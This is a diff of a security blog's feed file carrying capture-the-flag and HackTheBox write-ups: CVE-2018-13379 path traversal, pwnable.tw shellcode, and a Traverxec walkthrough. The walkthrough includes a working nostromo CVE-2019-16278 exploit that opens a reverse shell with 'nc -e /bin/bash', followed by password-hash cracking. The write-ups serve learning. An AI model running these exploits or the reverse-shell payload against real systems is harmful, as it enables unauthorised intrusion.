@@ -1,20 +1,37 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title></title>
-    <description>just a student whose love to break things mostly binary , i do programming in web as a backend developer, i'm a bug hunter too.feel free to contact me if you think i can help your company arsalan.dp@gmail.com</description>
-    <link>http://localhost:4000/</link>
-    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 03 Oct 2019 17:54:57 +0700</pubDate>
-    <lastBuildDate>Thu, 03 Oct 2019 17:54:57 +0700</lastBuildDate>
-    <generator>Jekyll v3.8.5</generator>
-    
-      <item>
-        <title>Simple demonstrating CVE-2018-13379</title>
-        <description>&lt;h1 id=&quot;story&quot;&gt;Story&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-01-26T11:58:51+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">tripoloski blog</title><subtitle>Hello i am arsalan , i blog about cyber security, ctf writeup , web development , and more about tech. born and raised in  indonesia , currently living in indonesia
+</subtitle><author><name>arsalan</name></author><entry><title type="html">Secure login facebook bountycon</title><link href="http://localhost:4000/ctf/2020/01/25/secure-login-facebook-bountycon.html" rel="alternate" type="text/html" title="Secure login facebook bountycon" /><published>2020-01-25T00:00:00+07:00</published><updated>2020-01-25T00:00:00+07:00</updated><id>http://localhost:4000/ctf/2020/01/25/secure-login-facebook-bountycon</id><content type="html" xml:base="http://localhost:4000/ctf/2020/01/25/secure-login-facebook-bountycon.html">&lt;p&gt;in last december someone on facebook share info about facebook bountycon , this is
+the only one pwn challenge on bountycon , here is how i solve it.&lt;/p&gt;
+
+&lt;p&gt;the description :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;We developed a super secure login system, but unfortunately we aren't
+familiar with those newfangled memory-safe languages.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and we are given 64-bit ELF binary&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./secure_login: ELF 64-bit LSB shared object,
+x86-64, version 1 (SYSV), dynamically linked,
+interpreter /lib64/l, BuildID[sha1]=e04815d2376518cc8b4295463f91479b57b8212a,
+for GNU/Linux 3.2.0, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;after open it on ida , i found some function&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;0x0000000000001269  wait_for_zombie&lt;/li&gt;
+  &lt;li&gt;0x0000000000001291  check_passwd&lt;/li&gt;
+  &lt;li&gt;0x0000000000001414  take_connections_forever&lt;/li&gt;
+  &lt;li&gt;0x00000000000014dc  main&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;the most intresting thing is check_passwd function. let’s check this function
+&lt;img src=&quot;/images/2020-01-25-230713_576x439_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;the pseudocode it self looks like this function will compare&lt;/p&gt;</content><author><name>arsalan</name></author><summary type="html">in last december someone on facebook share info about facebook bountycon , this is the only one pwn challenge on bountycon , here is how i solve it.</summary></entry><entry><title type="html">Simple demonstrating CVE-2018-13379</title><link href="http://localhost:4000/experience/2019/09/09/simple-demonstrating-CVE-2018-13379.html" rel="alternate" type="text/html" title="Simple demonstrating CVE-2018-13379" /><published>2019-09-09T17:55:00+07:00</published><updated>2019-09-09T17:55:00+07:00</updated><id>http://localhost:4000/experience/2019/09/09/simple-demonstrating-CVE-2018-13379</id><content type="html" xml:base="http://localhost:4000/experience/2019/09/09/simple-demonstrating-CVE-2018-13379.html">&lt;h1 id=&quot;story&quot;&gt;Story&lt;/h1&gt;
 &lt;p&gt;i know this bug after playing ctf on Cyber Jawara 2019. and i think it looks cool and it’s possible if someone implements the same code for development. after i got the flag i got the CVE code and my research soul really wanted to know more about this , after searching on internet i found article about it , it’s from orange whose found this bug &lt;a href=&quot;https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html&quot;&gt;here&lt;/a&gt; , he said&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;While fetching corresponding language file, 
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;While fetching corresponding language file,
 it builds the json file path with the parameter lang:
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -22,9 +39,9 @@ it builds the json file path with the parameter lang:
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/migadmin/lang/%s.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;There is no protection, but a file extension appended automatically. It seems like we can only 
-read json file. However, actually we can abuse the feature of snprintf. According to the man 
-page, it writes at most size-1 into the output string. Therefore, we only need to make it exceed 
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;There is no protection, but a file extension appended automatically. It seems like we can only
+read json file. However, actually we can abuse the feature of snprintf. According to the man
+page, it writes at most size-1 into the output string. Therefore, we only need to make it exceed
 the buffer size and the .json will be stripped. Then we can read whatever we want.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -34,7 +51,7 @@ the buffer size and the .json will be stripped. Then we can read whatever we wan
 #include &amp;lt;string.h&amp;gt;
 &lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;#define MAXN 128
-&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAXN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
   &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAXN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
@@ -114,22 +131,339 @@ geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin
 gnome-initial-setup:x:119:65534::/run/gnome-initial-setup/:/bin/false
 gdm:x:120:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
 tripoloski:x:1000:1000:tripoloski,,,:/home/tripoloski:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>arsalan</name></author><summary type="html">Story i know this bug after playing ctf on Cyber Jawara 2019. and i think it looks cool and it’s possible if someone implements the same code for development. after i got the flag i got the CVE code and my research soul really wanted to know more about this , after searching on internet i found article about it , it’s from orange whose found this bug here , he said</summary></entry><entry><title type="html">Open Read Write shellcoding</title><link href="http://localhost:4000/experience/2019/09/09/writting-open-read-write-shellcode.html" rel="alternate" type="text/html" title="Open Read Write shellcoding" /><published>2019-09-09T17:55:00+07:00</published><updated>2019-09-09T17:55:00+07:00</updated><id>http://localhost:4000/experience/2019/09/09/writting-open-read-write-shellcode</id><content type="html" xml:base="http://localhost:4000/experience/2019/09/09/writting-open-read-write-shellcode.html">&lt;h1 id=&quot;orw-writeup-pwnabletw&quot;&gt;orw writeup [pwnable.tw]&lt;/h1&gt;
+
+&lt;p&gt;Challenge description&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Read the flag from /home/orw/flag.
+Only open read write syscall are allowed to use.
+nc chall.pwnable.tw 10001
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-</description>
-        <pubDate>Mon, 09 Sep 2019 17:55:00 +0700</pubDate>
-        <link>http://localhost:4000/2019/09/09/simple-demonstrating-CVE-2018-13379/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019/09/09/simple-demonstrating-CVE-2018-13379/</guid>
-        
-        
-        <category>experience</category>
-        
-      </item>
-    
-      <item>
-        <title>Tcache Poisoning [heap exploitation]</title>
-        <description>&lt;h1 id=&quot;tcache-poisoning&quot;&gt;Tcache Poisoning&lt;/h1&gt;
-&lt;p&gt;what is tcache poisoning ? 
+&lt;p&gt;In this challenge we are given a binary , this is information about
+the binary&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And here are some of the protections that are active in this binary&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2019-12-04-135243_511x105_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yea, the NX protection is disabled , so we can run our code inside the stack segment&lt;/p&gt;
+
+&lt;h2 id=&quot;reverse-engineering&quot;&gt;Reverse engineering&lt;/h2&gt;
+
+&lt;p&gt;Okay we’ve got some information we need , now it’s time to look at the decompilation
+let’s open it on ghidra and see the main function&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2019-12-04-140618_359x196_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see , we can input data up to 200 bytes and our input will be stored
+at shellcode buffer , and after input the binary will jump to our buffer.
+and if you notice that , there is orw_seccomp() function , let’s use seccomp-tools
+to gathering more information&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2019-12-04-141345_527x245_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This binary allow us to use those syscall, so we can try to open the flag inside
+/home/orw/flag and read the value to buffer , and write the buffer.
+so it’s time to write some asm  , before we write the exploit we have to see syscall code you can use this site
+&lt;a href=&quot;https://syscalls.kernelgrok.com/&quot;&gt;here&lt;/a&gt; and search for sys_open , and this is what we got&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2019-12-04-142625_952x76_scrot.png&quot; class=&quot;center&quot; style=&quot;width: 800px;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;
+
+&lt;p&gt;We have to set eax register to 0x5 and ebx to our file path and more
+so firstly to open the file, i make assembly code, like this&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2019-12-04-144810_250x246_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It will xor eax with eax so the value will set to 0 and we do the same
+instructions for ecx , and mov eax with 0x5 (sys_open syscall) so now eax value will have
+0x5 (sys_open syscall) , and after that i push ecx and the string (as hex) to stack
+and mov ebx with esp&lt;/p&gt;
+
+&lt;p&gt;let’s do read&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2019-12-04-145249_222x159_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Actually we mov eax with 0x3 (sys_read syscall) and mov ecx with ebx ,ecx is our buffer
+and mov ebx with 0x3 because fd and mov dl with 0x30 for the size&lt;/p&gt;
+
+&lt;p&gt;and finally lets write it out&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2019-12-04-145735_225x117_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;mov eax with 0x4 (sys_write syscall) and mov bl with 0x1 for fd&lt;/p&gt;
+
+&lt;p&gt;and don’t forget every time we write shellcode that call a syscall we have to use int 0x80 at the end of our shellcode ,  int 0x80 is the assembly language instruction that is used to invoke system calls in Linux on x86 (i.e., Intel-compatible) processors.&lt;/p&gt;
+
+&lt;p&gt;here is my full exploit code :&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;# sys_open()
+&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''
+			xor 	eax, eax
+			xor 	ecx, ecx
+			mov 	eax, 0x5
+			push 	ecx
+			push 	0x67616c66       
+			push 	0x2f77726f       
+			push 	0x2f656d6f       
+			push 	0x682f2f2f       
+			mov 	ebx, esp
+			int 	0x80
+		'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;# sys_read()
+&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''
+			mov 	eax, 0x3
+			mov 	ecx, ebx
+			mov 	ebx, 0x3
+			mov 	dl, 0x30
+			int 	0x80
+		'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;# sys_write()
+&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''
+			mov 	eax, 0x4
+			mov 	bl, 0x1
+			int 0x80
+		'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;#r = process(&quot;./orw&quot;)
+&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;chall.pwnable.tw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And here is our flag :
+&lt;img src=&quot;/images/2019-12-04-151953_496x97_scrot.png&quot; /&gt;&lt;/p&gt;</content><author><name>arsalan</name></author><category term="ctf-writeup" /><category term="pwn" /><summary type="html">orw writeup [pwnable.tw]</summary></entry><entry><title type="html">CVE-2019-16278 Hackthebox Traverxec Writeup</title><link href="http://localhost:4000/experience/2019/09/09/hackthebox-Traverxec.html" rel="alternate" type="text/html" title="CVE-2019-16278 Hackthebox Traverxec Writeup" /><published>2019-09-09T17:55:00+07:00</published><updated>2019-09-09T17:55:00+07:00</updated><id>http://localhost:4000/experience/2019/09/09/hackthebox-Traverxec</id><content type="html" xml:base="http://localhost:4000/experience/2019/09/09/hackthebox-Traverxec.html">&lt;h1 id=&quot;traverxec&quot;&gt;Traverxec&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-221720_593x350_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;hello this is my writeup for Traverxec from hackthebox, an awesome platform to
+learn hacking&lt;/p&gt;
+
+&lt;h1 id=&quot;scanning&quot;&gt;Scanning&lt;/h1&gt;
+
+&lt;p&gt;for the first time, we have to gathering more information about this machine
+so i use nmap to see whats port is open and whats service is it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-222804_511x170_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;this machine running http (80) and ssh (22) ,after that i open the web page on my browser
+and this is the web page&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-223134_1288x562_scrot.png&quot; style=&quot;width: 500px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;it’s look like a normal static website, so i try to accessing /admin and this is what i got&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-223400_347x123_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;as you can see , this website is using nostromo web server , so i check about this webserver
+and searching for the bug and i got this CVE &lt;a href=&quot;https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html&quot;&gt;here&lt;/a&gt; so i create a python script to exploit the web server , this is my exploit :&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#CVE-2019-16278
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;nc -e /bin/bash 10.10.15.185 1337&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;POST /.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d./.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d./.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d./.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d./bin/sh HTTP/1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Length: 1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{} 2&amp;gt;&amp;amp;1&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;10.10.10.165&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;before running the script i listenning to port 1337 from my machine&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-224215_356x33_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and run the exploit&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-225200_443x154_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;after running the exploit , check the listenning terminal again , and we got
+our shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-225321_641x156_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;now lets see nostromo web server directory on /var/nostromo , and i found
+several directory&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conf
+htdocs
+icons
+logs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;the most intressting thing is conf folder , so i check conf directory and found two
+file&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimes
+nhttpd.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;nhttpd? hmm okay it’s looks intressting , so lets open it&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# MAIN [MANDATORY]
+
+servername		traverxec.htb
+serverlisten		*
+serveradmin		david@traverxec.htb
+serverroot		/var/nostromo
+servermimes		conf/mimes
+docroot			/var/nostromo/htdocs
+docindex		index.html
+
+# LOGS [OPTIONAL]
+
+logpid			logs/nhttpd.pid
+
+# SETUID [RECOMMENDED]
+
+user			www-data
+
+# BASIC AUTHENTICATION [OPTIONAL]
+
+htaccess		.htaccess
+htpasswd		/var/nostromo/conf/.htpasswd
+
+# ALIASES [OPTIONAL]
+
+/icons			/var/nostromo/icons
+
+# HOMEDIRS [OPTIONAL]
+
+homedirs		/home
+homedirs_public		public_www
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;cracking-htpasswd&quot;&gt;Cracking htpasswd&lt;/h1&gt;
+
+&lt;p&gt;as you can see , there is htpasswd inside /var/nostromo/conf/ and some
+HOMEDIRS configuration , lets see what inside htpasswd&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;the password is encrypted , so i check the hash using hashid&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-230146_567x75_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;well okay , lets use hashcat to crack it , after reading the example hash from
+hashcat documentation &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;here&lt;/a&gt;
+i got information about the hash-mode , it’s 500 so lets crack it using rockyou wordlist
+you can download the wordlist &lt;a href=&quot;https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=1&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=2ahUKEwj7gJXN-KjmAhXFR30KHQRKBXcQFjAAegQIARAB&amp;amp;url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&amp;amp;usg=AOvVaw3snAERl1mU6Ccr4WFEazBd&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-230819_641x46_scrot.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;okay good , we got the password. but this is not the ssh password , after enumerating and reading the manual &lt;a href=&quot;https://www.gsp.com/cgi-bin/man.cgi?section=8&amp;amp;topic=nhttpd#HOMEDIRS&quot;&gt;here&lt;/a&gt; i got something inside homedirs&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;To serve the home directories of your users via HTTP, enable the homedirs option by
+defining the path in where the home directories are stored, normally /home. To access
+a users home directory enter a ~ in the URL followed by the home directory name like
+in this example:
+
+http://www.nazgul.ch/~hacki/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;well , lets try to open on the machine.
+http://10.10.10.165/~david/&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/htb/Traverxec/2019-12-09-231221_1301x560_scrot.png&quot; style=&quot;width: 500px;&quot; /&gt;&lt;/p&gt;
+
